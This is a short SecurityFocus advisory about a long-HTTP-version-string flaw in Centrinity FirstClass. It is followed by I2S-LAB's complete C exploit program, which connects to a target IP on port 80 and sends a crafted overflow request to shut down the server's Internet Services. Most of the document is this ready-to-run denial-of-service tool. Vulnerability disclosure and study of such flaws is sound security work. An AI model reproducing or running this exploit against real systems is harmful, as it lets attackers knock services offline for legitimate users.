source: http://www.securityfocus.com/bid/8793/info

A problem has been reported in the handling of overly long HTTP version string data by Centrinity FirstClass. Because of this, it may be possible for an attacker deny service to legitimate users of a vulnerable system. This may be due to an exploitable boundary condition error, though this is not confirmed.

/*******************************************
 * FirstClass Internet Services Remote DoS *
 *******************************************

discovered & coded by I2S-LAB

 --------------------------------------------

This exploit uses a ptr overflow to remotely
shutdown the Internet Services of FirstClass.


  CONTACT
  _______

  Fred CHAVEROT : fred[at]I2S-LAB.com
  Aur=E9lien BOUDOUX : aurelien[at]I2S-LAB.com


  URL : http://www.I2S-LaB.com

 *******************************************/


#include <windows.h>
#include <winsock.h>
#pragma comment (lib,"wsock32.lib")

#define PerfectOverwrite 246

void main (int argc, char *argv[])
{

int len;
SOCKET sock1;
SOCKADDR_IN sin;
char *sav;

WSADATA wsadata;
WORD wVersionRequested = MAKEWORD (2,0);

printf ("- FirsClass Internet Services Remote DoS -\n\n"
"Discovered & coded by I2S-LAB\n"
"http://www.I2S-LaB.com\n\n");


if (!argv[1])
{
printf ("Usage : %s <IP Address>\n", argv[0]);
ExitProcess (0);
}

if (WSAStartup(wVersionRequested, &wsadata) ) ExitProcess (0);

if (!(sav = (char *) LocalAlloc (LPTR, 20 + PerfectOverwrite)) )
{
printf ("Error ! cannot allocate enough memory.\n");
ExitProcess (0);
};

lstrcat (sav, "GET / HTTP/1.1");
memset (&sav[14], 'A', PerfectOverwrite - 4);
lstrcat (sav,"DDDD\r\n\r\n");

sin.sin_family = AF_INET;
sin.sin_port = htons (80);

if ( (sin.sin_addr.s_addr=inet_addr (argv[1])) == INADDR_NONE)
{
printf ("Incorrect IP Address : %s\n", argv[1]);
ExitProcess(0);
}

sock1 = socket (AF_INET, SOCK_STREAM, 0);

printf ("\nconnecting to %s...", argv[1]);

if ( connect (sock1,(SOCKADDR *)&sin, sizeof (sin)) == SOCKET_ERROR )
printf ("connection failed!\n");

else
{
printf ("ok!\nSending crafted request...");

send (sock1,sav, PerfectOverwrite + 18,0);
puts ("ok!");
}

closesocket (sock1);
}
